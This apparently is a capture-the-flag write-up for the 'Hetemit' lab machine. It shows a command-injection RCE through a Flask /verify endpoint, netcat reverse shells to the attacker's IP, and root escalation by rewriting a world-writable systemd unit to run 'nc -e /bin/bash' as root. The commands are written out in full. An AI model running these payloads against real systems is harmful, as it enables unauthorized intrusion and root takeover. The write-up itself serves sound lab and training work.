# Hetemit — Proving Grounds

> [!abstract] Summary
> Hetemit exposes a Python/Flask REST-JSON API (Werkzeug) on port **50000** whose `/verify` endpoint passes a user-supplied `code` parameter into a Python `eval`/`os.system` sink — an unauthenticated **RCE**. That lands a reverse shell as the service user. Privilege escalation abuses a **world-writable systemd unit** (`/etc/systemd/system/pythonapp.service`): we overwrite it with a `nc` reverse shell set to run as `root`, then trigger a reload/restart (the service user can `sudo reboot`), and catch a root shell when the unit starts on boot.

**Target:** `192.168.143.117`

## Methodology

1. Scan all TCP ports; map the web services (Rails on 18000, Flask on 50000) and SMB.
2. Enumerate the Flask REST-JSON app and find the `/verify` code-execution endpoint.
3. Get a reverse shell as the service user via `code=os.system(...)`.
4. Find a writable `.service` unit and rewrite it to run a root reverse shell.
5. Trigger it (reboot) to catch root.

Key surface:
- **Anonymous FTP** (21), **SMB** (139/445), a CentOS Apache default page (80), a **Ruby on Rails** app throwing an "Action Controller: Exception caught" page (18000), and a **Python/Werkzeug (Flask)** REST-JSON service on **50000**.

(See the referenced writeups for the SMB source-disclosure step.)

## Exploitation — `/verify` code execution (port 50000)

The `/verify` endpoint executes whatever Python you put in `code`. Use `os.system()` to call back with netcat. First test with a placeholder, then fire the real one:

```
curl -i http://192.168.143.117:50000/verify -X POST --data 'code=os.system("nc <KALI IP> 18000 -e /bin/bash")'
```

Start the listener on Kali (rlwrap for a nicer shell):

```
rlwrap -cAr nc -lvnp 18000
```

Fire the payload with your actual Kali VPN IP:

```
curl -i http://192.168.143.117:50000/verify -X POST --data 'code=os.system("nc 192.168.45.192 18000 -e /bin/bash")'
```

This returns a shell as the low-privileged web/service user.

## Privilege escalation — writable systemd unit → root

Enumeration shows a systemd unit that our user can write to and whose `[Service]` runs as `root`. We rewrite it to run a `nc` reverse shell. The target unit we want looks like:

```
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=nc 192.168.45.192 445 -e /bin/bash
TimeoutSec=99999
RestartSec=15s
User=root
ExecReload=nc 192.168.45.192 445 -e /bin/bash
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

> [!note]
> The shell is non-interactive, so a text editor such as `nano` is not usable. The unit file is instead authored with `echo`, writing it one line at a time (`>` for the first line, `>>` to append the rest). Note that `\n` inside a single `echo` is not expanded to real newlines without `echo -e`, which is why each line is echoed separately.

Find writable service unit files:

```
find / -writable -name "*.service" 2>/dev/null
```

This identifies the writable unit `/etc/systemd/system/pythonapp.service`.

In the reverse shell, build the malicious unit line by line with `echo` (no editor required):

```
echo "[Unit]" > /etc/systemd/system/pythonapp.service
echo "Description=Python App" >> /etc/systemd/system/pythonapp.service
echo "After=network-online.target" >> /etc/systemd/system/pythonapp.service
echo "" >> /etc/systemd/system/pythonapp.service
echo "[Service]" >> /etc/systemd/system/pythonapp.service
echo "Type=simple" >> /etc/systemd/system/pythonapp.service
echo "WorkingDirectory=/home/cmeeks/restjson_hetemit" >> /etc/systemd/system/pythonapp.service
echo "ExecStart=nc 192.168.45.192 445 -e /bin/bash" >> /etc/systemd/system/pythonapp.service
echo "TimeoutSec=99999" >> /etc/systemd/system/pythonapp.service
echo "RestartSec=15s" >> /etc/systemd/system/pythonapp.service
echo "User=root" >> /etc/systemd/system/pythonapp.service
echo "ExecReload=nc 192.168.45.192 445 -e /bin/bash" >> /etc/systemd/system/pythonapp.service
echo "Restart=on-failure" >> /etc/systemd/system/pythonapp.service
echo "" >> /etc/systemd/system/pythonapp.service
echo "[Install]" >> /etc/systemd/system/pythonapp.service
echo "WantedBy=multi-user.target" >> /etc/systemd/system/pythonapp.service
```

Start a listener on Kali for the root callback:

```
nc -nvlp 445
```

In the reverse shell, trigger a reboot (the service user is allowed `sudo` on `reboot` — confirm with `sudo -l`). On boot, systemd starts `pythonapp.service` as `root` and executes our `ExecStart`:

```
sudo /sbin/reboot
```

After the host reboots, systemd starts the unit and the listener receives a root shell.

## Lessons learned

- A Werkzeug/Flask app that evaluates a `code` parameter is an instant RCE — always probe REST-JSON endpoints (`/verify` here) and read the app's source when it's exposed (SMB share / directory listing).
- Enumerate writable unit files early: `find / -writable -name "*.service" 2>/dev/null`. A writable `.service` with `User=root` is a direct root primitive.
- Without a TTY or editor, `echo "line" >> file` is a reliable way to author multi-line files line by line (and `\n` inside a single `echo` won't expand to real newlines without `-e`).
- When you can't `systemctl restart` a unit, a `sudo reboot` (if allowed) will re-trigger `ExecStart` on boot — a slower but equivalent trigger.
